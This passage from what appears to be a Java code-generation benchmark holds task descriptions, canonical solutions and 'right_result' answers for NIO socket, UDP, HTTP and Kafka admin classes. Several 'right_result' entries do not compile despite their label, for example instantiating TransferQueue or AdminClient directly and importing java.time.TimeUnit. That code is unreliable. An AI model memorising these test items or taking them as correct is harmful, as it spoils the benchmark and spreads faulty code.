serverChannel.accept();\n        clientChannel.configureBlocking(false);\n        clientChannel.register(selector, SelectionKey.OP_READ);\n        String currentDate = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\").format(new Date());\n        ByteBuffer buffer = ByteBuffer.wrap(currentDate.getBytes());\n        clientChannel.write(buffer);\n    }\n\n    public void close() throws IOException {\n        if (selector != null) {\n            selector.close();\n        }\n        for (ServerSocketChannel channel : serverChannels) {\n            if (channel != null) {\n                channel.close();\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 441,
    "Instruction": "Task Description: Implement a Unix domain socket-based IPC server using Java NIO that can listen for incoming messages and send responses asynchronously.\n\nClass Description: The Server class implements an IPC communicator that establishes a Unix domain socket server. It handles client connections asynchronously, processes incoming messages through a listener callback, and sends responses. The server manages its socket resources and cleans up the socket file on termination.\n\nAttributes:\n- serverSocketChannel: [ServerSocketChannel] - The NIO channel for accepting client connections on the Unix domain socket\n- socketPath: [Path] - Filesystem path where the Unix domain socket is created\n- LOG: [Logger] - Logger instance for recording server events and errors\n\nMethods:\n- create: [static](Path socketPath) -> [Server] - Factory method that creates and binds a Unix domain socket server at the specified path. Throws IOException if binding fails.\n- isClient: []() -> [boolean] - Returns false indicating this is a server-side communicator (always returns false for Server instances)\n- listen: [](IpcMessageListener listener, Executor executor) -> [void] - Starts listening for incoming messages asynchronously using the provided executor. Each message is delivered to the listener callback.\n- send: [](IpcMessage message, Executor executor) -> [void] - Sends a message to a connected client asynchronously using the provided executor.\n- close: []() -> [void] - Closes the server socket channel and deletes the socket file. Throws IOException if cleanup fails.",
    "Canonical_solution": "import org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport java.io.EOFException;\nimport java.io.IOException;\nimport java.net.StandardProtocolFamily;\nimport java.net.UnixDomainSocketAddress;\nimport java.nio.channels.AlreadyBoundException;\nimport java.nio.channels.AsynchronousCloseException;\nimport java.nio.channels.ClosedChannelException;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.UnsupportedAddressTypeException;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.util.concurrent.Executor;\n\nclass Server implements IpcCommunicator {\n\n\tprivate static final Logger LOG = LoggerFactory.getLogger(Server.class);\n\n\tprivate final ServerSocketChannel serverSocketChannel;\n\tprivate final Path socketPath;\n\n\tprivate Server(ServerSocketChannel serverSocketChannel, Path socketPath) {\n\t\tthis.serverSocketChannel = serverSocketChannel;\n\t\tthis.socketPath = socketPath;\n\t}\n\n\tpublic static Server create(Path socketPath) throws IOException {\n\t\tFiles.createDirectories(socketPath.getParent());\n\t\tvar address = UnixDomainSocketAddress.of(socketPath);\n\t\tServerSocketChannel ch = null;\n\t\ttry {\n\t\t\tch = ServerSocketChannel.open(StandardProtocolFamily.UNIX);\n\t\t\tch.bind(address);\n\t\t\tLOG.info(\"Spawning IPC server listening on socket {}\", socketPath);\n\t\t\treturn new Server(ch, socketPath);\n\t\t} catch (IOException | AlreadyBoundException | UnsupportedAddressTypeException e) {\n\t\t\tif (ch != null) {\n\t\t\t\tch.close();\n\t\t\t}\n\t\t\tthrow e;\n\t\t}\n\t}\n\n\t@Override\n\tpublic boolean isClient() {\n\t\treturn false;\n\t}\n\n\t@Override\n\tpublic void listen(IpcMessageListener listener, Executor executor) {\n\t\texecutor.execute(() -> {\n\t\t\twhile (serverSocketChannel.isOpen()) {\n\t\t\t\ttry (var ch = serverSocketChannel.accept()) {\n\t\t\t\t\twhile (ch.isConnected()) {\n\t\t\t\t\t\tvar msg = IpcMessage.receive(ch);\n\t\t\t\t\t\tlistener.handleMessage(msg);\n\t\t\t\t\t}\n\t\t\t\t} catch (AsynchronousCloseException e) {\n\t\t\t\t\treturn;\n\t\t\t\t} catch (EOFException | ClosedChannelException e) {\n\t\t\t\t\t// continue with next connected client\n\t\t\t\t} catch (IOException e) {\n\t\t\t\t\tLOG.error(\"Failed to read IPC message\", e);\n\t\t\t\t}\n\t\t\t}\n\t\t});\n\t}\n\n\t@Override\n\tpublic void send(IpcMessage message, Executor executor) {\n\t\texecutor.execute(() -> {\n\t\t\ttry (var ch = serverSocketChannel.accept()) {\n\t\t\t\tmessage.send(ch);\n\t\t\t} catch (IOException e) {\n\t\t\t\tLOG.error(\"Failed to send IPC message\", e);\n\t\t\t}\n\t\t});\n\t}\n\n\t@Override\n\tpublic void close() throws IOException {\n\t\ttry {\n\t\t\tserverSocketChannel.close();\n\t\t} finally {\n\t\t\tFiles.deleteIfExists(socketPath);\n\t\t\tLOG.debug(\"IPC server closed\");\n\t\t}\n\t}\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 7,
    "right_result": "import java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.channels.*;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.util.concurrent.Executor;\nimport java.util.logging.Logger;\n\npublic class Server {\n    private final ServerSocketChannel serverSocketChannel;\n    private final Path socketPath;\n    private final Logger LOG;\n\n    public static Server create(Path socketPath) throws IOException {\n        Server server = new Server(socketPath);\n        server.serverSocketChannel = ServerSocketChannel.open();\n        server.serverSocketChannel.configureBlocking(false);\n        server.serverSocketChannel.bind(new InetSocketAddress(socketPath.toString()));\n        return server;\n    }\n\n    public boolean isClient() {\n        return false;\n    }\n\n    public void listen(IpcMessageListener listener, Executor executor) {\n        new Thread(() -> {\n            try {\n                while (true) {\n                    SocketChannel clientChannel = serverSocketChannel.accept();\n                    if (clientChannel != null) {\n                        executor.execute(() -> {\n                            try {\n                                byte[] buffer = new byte[1024];\n                                int bytesRead;\n                                while ((bytesRead = clientChannel.read(buffer)) > 0) {\n                                    String message = new String(buffer, 0, bytesRead);\n                                    listener.onMessage(message);\n                                }\n                            } catch (IOException e) {\n                                LOG.severe(\"Error reading from client: \" + e.getMessage());\n                            } finally {\n                                try {\n                                    clientChannel.close();\n                                } catch (IOException e) {\n                                    LOG.severe(\"Error closing client channel: \" + e.getMessage());\n                                }\n                            }\n                        });\n                    }\n                }\n            } catch (IOException e) {\n                LOG.severe(\"Error listening for messages: \" + e.getMessage());\n            }\n        }).start();\n    }\n\n    public void send(IpcMessage message, Executor executor) {\n        executor.execute(() -> {\n            try {\n                // Assume a connected client is tracked\n                // This is a simplified placeholder; actual implementation would require tracking clients\n                SocketChannel clientChannel = SocketChannel.open();\n                clientChannel.connect(new InetSocketAddress(socketPath.toString()));\n                clientChannel.write(ByteBuffer.wrap(message.toString().getBytes()));\n                clientChannel.close();\n            } catch (IOException e) {\n                LOG.severe(\"Error sending message: \" + e.getMessage());\n            }\n        });\n    }\n\n    public void close() throws IOException {\n        if (serverSocketChannel != null) {\n            serverSocketChannel.close();\n        }\n        Files.delete(socketPath);\n    }\n}"
  },
  {
    "Task_id": 445,
    "Instruction": "Task Description: Implement a Java class for UDP-based communication with OpenTracker for live synchronization of peer information using Java NIO's non-blocking DatagramChannel.\n\nClass Description: The OpentrackerLiveSync class handles UDP communication with an OpenTracker server for peer synchronization. It uses non-blocking I/O to send peer information packets to a multicast group. The class maintains a queue of outgoing messages and processes them in batches.\n\nAttributes:\n- toSend: TransferQueue<ByteBuffer> - Thread-safe queue holding outgoing peer information packets\n- channel: DatagramChannel - The UDP communication channel for sending data\n- id: byte[] - 4-byte random identifier for this client\n- running: volatile boolean - Flag controlling the operation of the sender thread\n- HEADER_LENGTH: static final int - Constant for header size (8 bytes)\n- PEER_LENGTH: static final int - Constant for peer information size (28 bytes)\n- PEERS_PER_PACKET: static final int - Constant for maximum peers per packet (50)\n\nMethods:\n- OpentrackerLiveSync() -> None - Constructor initializes random client ID\n- start() -> None - Initializes UDP channel and starts sender thread\n- incomingPacket(MessageBase msg) -> None - Processes incoming messages and queues valid peer requests\n- send() -> None - Worker method that sends batched peer information packets\n- stop() -> None - Stops the sender thread and closes the channel\n\nInput Parameters for Methods:\n- incomingPacket: msg [MessageBase] - The incoming message to process\n- (Other methods take no explicit parameters)\n\nOutput/Return Values:\n- All methods return void except the constructor\n- Methods primarily affect class state and perform I/O operations",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.Inet4Address;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.net.StandardProtocolFamily;\nimport java.net.StandardSocketOptions;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.DatagramChannel;\nimport java.util.concurrent.LinkedTransferQueue;\nimport java.util.concurrent.ThreadLocalRandom;\nimport java.util.concurrent.TransferQueue;\n\npublic class OpentrackerLiveSync {\n\n    TransferQueue<ByteBuffer> toSend = new LinkedTransferQueue<>();\n    DatagramChannel channel;\n    byte[] id = new byte[4];\n    volatile boolean running = true;\n    \n    private static final int HEADER_LENGTH = 0x08;\n    private static final int PEER_LENGTH = 0x1C;\n    private static final int PEERS_PER_PACKET = 50;\n    \n    public OpentrackerLiveSync() {\n        ThreadLocalRandom.current().nextBytes(id);\n    }\n    \n    public void start() {\n        try {\n            channel = DatagramChannel.open(StandardProtocolFamily.INET);\n            channel.setOption(StandardSocketOptions.IP_MULTICAST_TTL, 1);\n            channel.setOption(StandardSocketOptions.SO_REUSEADDR, true);\n            channel.bind(new InetSocketAddress(0));\n            channel.connect(new InetSocketAddress(InetAddress.getByAddress(new byte[] {(byte) 224,0,23,5}), 9696));\n        } catch (IOException e) {\n            e.printStackTrace();\n            return;\n        }\n        \n        Thread t = new Thread(this::send);\n        t.setDaemon(true);\n        t.setName(\"opentracker-sync\");\n        t.start();\n    }\n    \n    public void incomingPacket(MessageBase msg) {\n        if(!running)\n            return;\n        if(msg.getType() != MessageBase.Type.REQ_MSG || msg.getMethod() != MessageBase.Method.GET_PEERS)\n            return;\n        \n        GetPeersRequest req = (GetPeersRequest) msg;\n        \n        ByteBuffer buf = ByteBuffer.allocate(PEER_LENGTH);\n        buf.put(req.getTarget().getHash());\n        buf.put(req.getOrigin().getAddress().getAddress());\n        buf.putShort((short) req.getOrigin().getPort());\n        buf.putShort((short) 0);\n        buf.flip();\n        toSend.add(buf);\n    }\n    \n    void send() {\n        ByteBuffer sendBuffer = ByteBuffer.allocate(HEADER_LENGTH);\n        sendBuffer.put(id);\n        sendBuffer.put(new byte[4]);\n        sendBuffer.flip();\n        \n        ByteBuffer[] buffers = new ByteBuffer[1 + PEERS_PER_PACKET];\n        buffers[0] = sendBuffer;\n\n        try {\n            while(running) {\n                for(int i = 1;i<buffers.length;i++) {\n                    buffers[i] = toSend.take();\n                }\n                \n                channel.write(buffers);\n                buffers[0].rewind();\n            }\n        } catch (IOException | InterruptedException e) {\n            running = false;\n            e.printStackTrace();\n        }\n    }\n\n    public void stop() {\n        running = false;\n        try {\n            channel.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 8,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.*;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.DatagramChannel;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.concurrent.TransferQueue;\n\npublic class OpentrackerLiveSync {\n    private final TransferQueue<ByteBuffer> toSend;\n    private DatagramChannel channel;\n    private final byte[] id;\n    private volatile boolean running;\n    static final int HEADER_LENGTH = 8;\n    static final int PEER_LENGTH = 28;\n    static final int PEERS_PER_PACKET = 50;\n\n    public OpentrackerLiveSync() {\n        toSend = new TransferQueue<>();\n        id = new byte[4];\n        new java.util.Random().nextBytes(id);\n    }\n\n    public void start() {\n        try {\n            channel = DatagramChannel.open();\n            channel.configureBlocking(false);\n            Socket socket = channel.socket();\n            InetSocketAddress group = new InetSocketAddress(\"224.0.0.1\", 5000);\n            socket.joinGroup(group);\n            channel.bind(new InetSocketAddress(0));\n            running = true;\n            new Thread(this::send).start();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void incomingPacket(MessageBase msg) {\n        if (msg instanceof PeerRequest) {\n            ByteBuffer peerData = ((PeerRequest) msg).getData();\n            toSend.put(peerData);\n        }\n    }\n\n    private void send() {\n        while (running) {\n            int count = 0;\n            List<ByteBuffer> batch = new ArrayList<>();\n            while (count < PEERS_PER_PACKET && !toSend.isEmpty()) {\n                ByteBuffer buffer = toSend.poll();\n                if (buffer != null) {\n                    batch.add(buffer);\n                    count++;\n                }\n            }\n            if (count > 0) {\n                try {\n                    ByteBuffer packet = ByteBuffer.allocate(HEADER_LENGTH + count * PEER_LENGTH);\n                    packet.putInt(count);\n                    for (ByteBuffer peer : batch) {\n                        packet.put(peer);\n                    }\n                    packet.flip();\n                    InetSocketAddress address = new InetSocketAddress(\"224.0.0.1\", 5000);\n                    channel.send(packet, address);\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n\n    public void stop() {\n        running = false;\n        try {\n            if (channel != null) {\n                channel.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 446,
    "Instruction": "Task Description: Create a Java class that implements a non-blocking UDP sender using Java NIO's DatagramChannel for asynchronous communication.\n\nClass Description: The Sender class provides functionality to establish a non-blocking UDP connection, send data packets to a specified host and port, and manage the connection lifecycle. It uses Java NIO's DatagramChannel for efficient network communication.\n\nAttributes:\n- host: [String] - The target hostname or IP address for UDP communication\n- port: [int] - The target port number for UDP communication\n- address: [InetSocketAddress] - The socket address combining host and port for the target\n- channel: [DatagramChannel] - The NIO channel used for UDP communication\n\nMethods:\n- connect(): [void] -> [void] - Opens a DatagramChannel and prepares it for communication. Throws IOException if connection fails and IllegalStateException if already connected.\n- isConnected(): [void] -> [boolean] - Checks if the channel is currently connected and not closed.\n- send(ByteBuffer buffer): [ByteBuffer] -> [void] - Sends the contents of the provided ByteBuffer to the target address. Throws IOException if sending fails.\n- disconnect(): [void] -> [void] - Closes the DatagramChannel and releases resources. Safe to call even if not connected.",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.DatagramChannel;\n\npublic class Sender {\n\n    private final String host;\n    private final int port;\n    private InetSocketAddress address;\n    private DatagramChannel channel;\n\n    public Sender(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void connect() throws IOException {\n        if (isConnected()) {\n            throw new IllegalStateException(\"Already connected\");\n        }\n        if (host != null) {\n            address = new InetSocketAddress(host, port);\n        }\n        channel = DatagramChannel.open();\n    }\n\n    public boolean isConnected() {\n        return channel != null && !channel.socket().isClosed();\n    }\n\n    public void send(ByteBuffer buffer) throws IOException {\n        channel.send(buffer, address);\n    }\n\n    public void disconnect() throws IOException {\n        if (channel == null) {\n            return;\n        }\n        try {\n            channel.close();\n        } finally {\n            channel = null;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 8,
    "right_result": "import java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.DatagramChannel;\n\npublic class Sender {\n    private String host;\n    private int port;\n    private InetSocketAddress address;\n    private DatagramChannel channel;\n\n    public Sender(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void connect() throws IOException {\n        if (isConnected()) {\n            throw new IllegalStateException(\"Already connected\");\n        }\n        channel = DatagramChannel.open();\n        channel.configureBlocking(false);\n        address = new InetSocketAddress(host, port);\n        channel.connect(address);\n    }\n\n    public boolean isConnected() {\n        return channel != null && channel.isConnected() && !channel.isClosed();\n    }\n\n    public void send(ByteBuffer buffer) throws IOException {\n        if (!isConnected()) {\n            throw new IOException(\"Not connected\");\n        }\n        channel.send(buffer, address);\n    }\n\n    public void disconnect() {\n        if (channel != null) {\n            try {\n                channel.close();\n            } catch (IOException e) {\n                // Ignore exception, as per problem statement\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 45,
    "Instruction": "Task Description: Create a Java class that implements HTTP client functionality for interacting with a radio scanner API, supporting both synchronous and asynchronous requests.\n\nClass Description: The RdioScannerHttpClient class provides methods to test API connections and send audio recordings to a radio scanner service using HTTP multipart form data requests. It uses Java's HttpClient for HTTP/2 communication with configurable timeouts and redirect policies.\n\nAttributes:\n- mHttpClient: [HttpClient] - The underlying HTTP client instance configured with HTTP/2 support, 20-second timeout, and normal redirect policy\n\nMethods:\n- testConnection: [testConnection]([RdioScannerConfiguration configuration]) -> [String] - Synchronously tests the API connection by sending a test request with the API key and system ID, returns the response body with status code or error message\n- sendAudioRecordingAsync: [sendAudioRecordingAsync]([RdioScannerConfiguration config, RdioScannerBuilder bodyBuilder]) -> [void] - Asynchronously sends an audio recording to the API using multipart form data, handles response completion with success/error callbacks",
    "Canonical_solution": "import java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.time.Duration;\n\npublic class RdioScannerHttpClient {\n\n    private HttpClient mHttpClient = HttpClient.newBuilder()\n        .version(HttpClient.Version.HTTP_2)\n        .followRedirects(HttpClient.Redirect.NORMAL)\n        .connectTimeout(Duration.ofSeconds(20))\n        .build();\n\n    public String testConnection(RdioScannerConfiguration configuration) {\n        RdioScannerBuilder bodyBuilder = new RdioScannerBuilder();\n        bodyBuilder.addPart(FormField.KEY, configuration.getApiKey())\n            .addPart(FormField.SYSTEM, configuration.getSystemID())\n            .addPart(FormField.TEST, 1);\n\n        HttpRequest request = HttpRequest.newBuilder()\n            .uri(URI.create(configuration.getHost()))\n            .header(HttpHeaders.CONTENT_TYPE, MULTIPART_FORM_DATA + \"; boundary=\" + bodyBuilder.getBoundary())\n            .header(HttpHeaders.USER_AGENT, \"sdrtrunk\")\n            .header(HttpHeaders.ACCEPT, \"*/*\")\n            .POST(bodyBuilder.build())\n            .build();\n\n        HttpResponse.BodyHandler<String> responseHandler = HttpResponse.BodyHandlers.ofString();\n\n        try {\n            HttpResponse<String> response = mHttpClient.send(request, responseHandler);\n            String responseBody = response.body();\n            return (responseBody != null ? responseBody : \"(no response)\") + \" Status Code:\" + response.statusCode();\n        }\n        catch(Exception e) {\n            return e.getLocalizedMessage();\n        }\n    }\n\n    public void sendAudioRecordingAsync(RdioScannerConfiguration config, RdioScannerBuilder bodyBuilder) {\n        HttpRequest fileRequest = HttpRequest.newBuilder()\n            .uri(URI.create(config.getHost()))\n            .header(HttpHeaders.CONTENT_TYPE, MULTIPART_FORM_DATA + \"; boundary=\" + bodyBuilder.getBoundary())\n            .header(HttpHeaders.USER_AGENT, \"sdrtrunk\")\n            .POST(bodyBuilder.build())\n            .build();\n\n        mHttpClient.sendAsync(fileRequest, HttpResponse.BodyHandlers.ofString())\n            .whenComplete((fileResponse, throwable1) -> {\n                if(throwable1 != null || fileResponse.statusCode() != 200) {\n                    if(throwable1 instanceof IOException || throwable1 instanceof CompletionException) {\n                        // Handle error cases\n                    }\n                }\n                else {\n                    // Handle successful response\n                }\n            });\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 17,
    "right_result": "import java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.time.Duration;\nimport java.util.concurrent.CompletableFuture;\n\npublic class RdioScannerHttpClient {\n    private final HttpClient mHttpClient;\n\n    public RdioScannerHttpClient() {\n        mHttpClient = HttpClient.newBuilder()\n                .connectTimeout(Duration.ofSeconds(20))\n                .build();\n    }\n\n    public String testConnection(RdioScannerConfiguration configuration) throws Exception {\n        String url = configuration.getBaseURL() + \"/test?apiKey=\" + configuration.getApiKey() + \"&systemId=\" + configuration.getSystemId();\n        HttpRequest request = HttpRequest.newBuilder()\n                .GET()\n                .uri(URI.create(url))\n                .build();\n        HttpResponse<String> response = mHttpClient.send(request, HttpResponse.BodyHandlers.ofString());\n        return response.statusCode() + \" \" + response.body();\n    }\n\n    public void sendAudioRecordingAsync(RdioScannerConfiguration config, RdioScannerBuilder bodyBuilder) {\n        String url = config.getBaseURL() + \"/upload\";\n        HttpRequest request = HttpRequest.newBuilder()\n                .POST(HttpRequest.BodyPublishers.ofString(bodyBuilder.build()))\n                .uri(URI.create(url))\n                .build();\n        mHttpClient.sendAsync(request, HttpResponse.BodyHandlers.ofString())\n                .thenAccept(response -> {\n                    System.out.println(\"Success: \" + response.body());\n                })\n                .exceptionally(ex -> {\n                    System.err.println(\"Error: \" + ex.getMessage());\n                    return null;\n                });\n    }\n}"
  },
  {
    "Task_id": 454,
    "Instruction": "Task Description: Retrieve the configurations of specified Kafka topics using the Kafka AdminClient API.\n\nFunction Description: This function connects to a Kafka cluster using the provided bootstrap servers and retrieves the configurations for the specified topic names. It utilizes the Kafka AdminClient to describe the configurations and returns them as a map of ConfigResource to Config objects.\n\nInput: \n- bootstrapServers: [String] - Comma-separated list of host/port pairs to use for establishing the initial connection to the Kafka cluster.\n- topicNames: [String[]] - Array of topic names for which configurations need to be retrieved.\n\nOutput: \n- [Map<ConfigResource, Config>] - A map where keys are ConfigResource objects representing the topics, and values are Config objects containing the configuration entries for each topic. The operation will timeout after 3 seconds if the configuration retrieval is not completed.",
    "Canonical_solution": "import org.apache.kafka.clients.admin.AdminClient;\nimport org.apache.kafka.clients.admin.AdminClientConfig;\nimport org.apache.kafka.clients.admin.DescribeConfigsResult;\nimport org.apache.kafka.clients.admin.Config;\nimport org.apache.kafka.common.config.ConfigResource;\nimport java.util.Map;\nimport java.util.HashMap;\nimport java.util.Arrays;\nimport java.util.concurrent.TimeUnit;\n\npublic Map<ConfigResource, Config> getTopicConfigurations(String bootstrapServers, String[] topicNames) throws Exception {\n    Map<String, Object> adminClientConfig = new HashMap<>();\n    adminClientConfig.put(AdminClientConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapServers);\n    AdminClient adminClient = AdminClient.create(adminClientConfig);\n    \n    ConfigResource[] configResources = Arrays.stream(topicNames)\n        .map(topicName -> new ConfigResource(ConfigResource.Type.TOPIC, topicName))\n        .toArray(ConfigResource[]::new);\n        \n    DescribeConfigsResult describeConfigsResult = adminClient.describeConfigs(Arrays.asList(configResources));\n    return describeConfigsResult.all().get(3, TimeUnit.SECONDS);\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 36,
    "right_result": "import org.apache.kafka.clients.admin.AdminClient;\nimport org.apache.kafka.common.resource.ConfigResource;\nimport org.apache.kafka.common.config.Config;\nimport java.util.*;\nimport java.time.TimeUnit;\n\npublic class KafkaConfigRetriever {\n    public static Map<ConfigResource, Config> getTopicConfigurations(String bootstrapServers, String[] topicNames) {\n        Properties props = new Properties();\n        props.put(\"bootstrap.servers\", bootstrapServers);\n        AdminClient adminClient = AdminClient.create(props);\n        \n        List<ConfigResource> resources = new ArrayList<>();\n        for (String topic : topicNames) {\n            resources.add(new ConfigResource(ConfigResource.Type.TOPIC, topic));\n        }\n        \n        try {\n            Map<ConfigResource, Config> configs = adminClient.describeConfigs(resources).get(3, TimeUnit.SECONDS);\n            return configs;\n        } catch (Exception e) {\n            throw new RuntimeException(\"Failed to retrieve configurations\", e);\n        } finally {\n            adminClient.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 455,
    "Instruction": "Task Description: Write a function that retrieves the configuration details of specified Kafka topics using the Kafka AdminClient API.\n\nFunction Description: The function connects to a Kafka cluster using the provided bootstrap servers, then fetches and returns the configuration details for each specified topic name. It utilizes Kafka's AdminClient to describe topic configurations and returns them as a map of ConfigResource to Config objects.\n\nInput: \n- bootstrapServers: [String] - Comma-separated list of host:port pairs for establishing the initial connection to the Kafka cluster\n- topicNames: [String[]] - Array of topic names whose configurations need to be retrieved\n\nOutput: \n- Returns [Map<ConfigResource, Config>] - A map where keys are ConfigResource objects representing the topics, and values are Config objects containing the configuration details for each topic\n- Throws [Exception] - If there's any error during the configuration retrieval process or if the operation times out",
    "Canonical_solution": "import org.apache.kafka.clients.admin.AdminClient;\nimport org.apache.kafka.clients.admin.AdminClientConfig;\nimport org.apache.kafka.clients.admin.DescribeConfigsResult;\nimport org.apache.kafka.clients.admin.Config;\nimport org.apache.kafka.common.config.ConfigResource;\nimport java.util.Map;\nimport java.util.HashMap;\nimport java.util.Arrays;\nimport java.util.concurrent.TimeUnit;\n\npublic Map<ConfigResource, Config> getKafkaTopicConfigs(String bootstrapServers, String[] topicNames) throws Exception {\n    Map<String, Object> adminClientConfig = new HashMap<>();\n    adminClientConfig.put(AdminClientConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapServers);\n    AdminClient adminClient = AdminClient.create(adminClientConfig);\n    \n    ConfigResource[] configResources = Arrays.stream(topicNames)\n        .map(topicName -> new ConfigResource(ConfigResource.Type.TOPIC, topicName))\n        .toArray(ConfigResource[]::new);\n        \n    DescribeConfigsResult describeConfigsResult = adminClient.describeConfigs(Arrays.asList(configResources));\n    return describeConfigsResult.all().get(3, TimeUnit.SECONDS);\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 36,
    "right_result": "import org.apache.kafka.common.config.Config;\nimport org.apache.kafka.common.config.ConfigResource;\nimport org.apache.kafka.common.admin.AdminClient;\nimport org.apache.kafka.common.admin.AdminClientConfig;\n\nimport java.util.ArrayList;\nimport java.util.Map;\nimport java.util.Properties;\nimport java.util.List;\n\npublic class KafkaConfigRetriever {\n    public static Map<ConfigResource, Config> getTopicConfigurations(String bootstrapServers, String[] topicNames) throws Exception {\n        Properties props = new Properties();\n        props.put(AdminClientConfig.BOOTSTRAP_SERVERS_CONFIG, bootstrapServers);\n        props.put(AdminClientConfig.REQUEST_TIMEOUT_MS_CONFIG, \"30000\");\n        AdminClient adminClient = AdminClient.create(props);\n\n        List<ConfigResource> configResources = new ArrayList<>();\n        for (String topic : topicNames) {\n            configResources.add(new ConfigResource(ConfigResource.Type.TOPIC, topic));\n        }\n\n        Map<ConfigResource, Config> configMap = adminClient.describeConfigs(configResources).get();\n\n        adminClient.close();\n\n        return configMap;\n    }\n}"
  },
  {
    "Task_id": 457,
    "Instruction": "Task Description: Implement a Kafka topic administration utility class that provides functionality to describe Kafka topics using the AdminClient API.\n\nClass Description: The `KafkaTopicAdmin` class is a utility class designed to interact with Apache Kafka's administrative API. It provides methods to perform administrative operations on Kafka topics, specifically focusing on describing topic configurations. The class handles connection management and timeout configurations for administrative operations.\n\nAttributes:\n- configs: [Map<String, Object>] - Configuration properties for connecting to the Kafka cluster (e.g., bootstrap servers, security settings)\n- operationTimeout: [int] - Timeout duration in seconds for administrative operations\n\nMethods:\n- describeTopics: [describeTopics](String... topicNames) -> Map<String, TopicDescription> - Describes the specified Kafka topics by returning their configurations including partition count, replication factor, and other metadata. Throws KafkaException for operation failures or interruptions.\n- createAdmin: [createAdmin]() -> Admin - Creates and returns an AdminClient instance using the configured properties. Protected method for internal use.\n- getAdminConfig: [getAdminConfig]() -> Map<String, Object> - Returns a copy of the admin client configuration. Protected method for internal use.\n\nThe class implements AutoCloseable behavior through the AdminClient resource management in the describeTopics method, ensuring proper cleanup of resources. It handles various failure scenarios including timeouts, execution exceptions, and thread interruptions by wrapping them in appropriate KafkaException instances.",
    "Canonical_solution": "import org.apache.kafka.clients.admin.Admin;\nimport org.apache.kafka.clients.admin.AdminClient;\nimport org.apache.kafka.clients.admin.AdminClientConfig;\nimport org.apache.kafka.clients.admin.DescribeTopicsResult;\nimport org.apache.kafka.clients.admin.TopicDescription;\nimport org.springframework.kafka.KafkaException;\n\nimport java.util.Arrays;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.concurrent.ExecutionException;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.TimeoutException;\n\npublic class KafkaTopicAdmin {\n\n    private final Map<String, Object> configs;\n    private final int operationTimeout;\n\n    public KafkaTopicAdmin(Map<String, Object> configs, int operationTimeout) {\n        this.configs = new HashMap<>(configs);\n        this.operationTimeout = operationTimeout;\n    }\n\n    public Map<String, TopicDescription> describeTopics(String... topicNames) {\n        try (Admin admin = createAdmin()) {\n            Map<String, TopicDescription> results = new HashMap<>();\n            DescribeTopicsResult topics = admin.describeTopics(Arrays.asList(topicNames));\n            try {\n                results.putAll(topics.allTopicNames().get(this.operationTimeout, TimeUnit.SECONDS));\n                return results;\n            }\n            catch (InterruptedException ie) {\n                Thread.currentThread().interrupt();\n                throw new KafkaException(\"Interrupted while getting topic descriptions\", ie);\n            }\n            catch (TimeoutException | ExecutionException ex) {\n                throw new KafkaException(\"Failed to obtain topic descriptions\", ex);\n            }\n        }\n    }\n\n    protected Admin createAdmin() {\n        return AdminClient.create(getAdminConfig());\n    }\n\n    protected Map<String, Object> getAdminConfig() {\n        final Map<String, Object> configs2 = new HashMap<>(this.configs);\n        return configs2;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 35,
    "right_result": "```java\nimport org.apache.kafka.clients.admin.AdminClient;\nimport org.apache.kafka.clients.admin.DescribeTopicsResult;\nimport org.apache.kafka.clients.admin.TopicDescription;\nimport org.apache.kafka.common.KafkaException;\n\nimport java.util.*;\nimport java.util.concurrent.ExecutionException;\n\npublic class KafkaTopicAdmin implements AutoCloseable {\n    private final Map<String, Object> configs;\n    private final int operationTimeout;\n\n    public KafkaTopicAdmin(Map<String, Object> configs, int operationTimeout) {\n        this.configs = configs;\n        this.operationTimeout = operationTimeout;\n    }\n\n    protected Admin createAdmin() {\n        Map<String, Object> adminConfig = new HashMap<>(configs);\n        adminConfig.put(\"operation.timeout.ms\", operationTimeout * 1000);\n        return new AdminClient(adminConfig);\n    }\n\n    public Map<String, TopicDescription> describeTopics(String... topicNames) throws KafkaException {\n        try {\n            Admin admin = createAdmin();\n            DescribeTopicsResult result = admin.describeTopics(Arrays.asList(topicNames));\n            Map<String, TopicDescription> descriptions = new HashMap<>();\n            for (Map.Entry<String, TopicDescription> entry : result.all().get()) {\n                descriptions.put(entry.getKey(), entry.getValue());\n            }\n            return descriptions;\n        } catch (ExecutionException | InterruptedException e) {\n            